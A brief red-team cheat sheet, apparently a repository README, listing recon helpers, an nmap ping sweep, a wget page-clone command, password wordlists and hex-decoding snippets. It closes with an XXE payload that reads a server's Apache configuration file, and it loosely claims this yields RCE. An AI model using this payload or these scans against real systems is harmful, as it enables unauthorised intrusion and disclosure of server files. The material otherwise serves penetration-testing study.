# Red Team

* gethead.sh - gets HEAD from some webservesr.
* getrobots.sh - get ```robots.txt`` from webservers.
* hexstr.py - converts hex-encoded str back to ascii

### Very quick ping sweep
```sudo nmap -n -sn -PE -T5 $ipRange```

### Clone web page
```wget -r -nH $url```


### Wordlists
* [SecList](https://github.com/danielmiessler/SecLists)
* raft-large
* rockyou

## Python

## Dealing with hex encoded strings.

### Convert hex to dec, 6c = 'l'
```dec = int("6c", 16)```

### Print that in ascii
``` print chr(dec)```

## XXE (XML External Entity)

Find some Rest/XML API endpoint of a webapp, using POST requests you can get it to RCE.
```xml
<?xml version="1.0"?>
<!DOCTYPE food [
<!ELEMENT foo ANY>
<!ENTITY entityex SYSTEM "file:///etc/apache2/apache2.conf">
]>
<abc>&entityex;</abc>
```

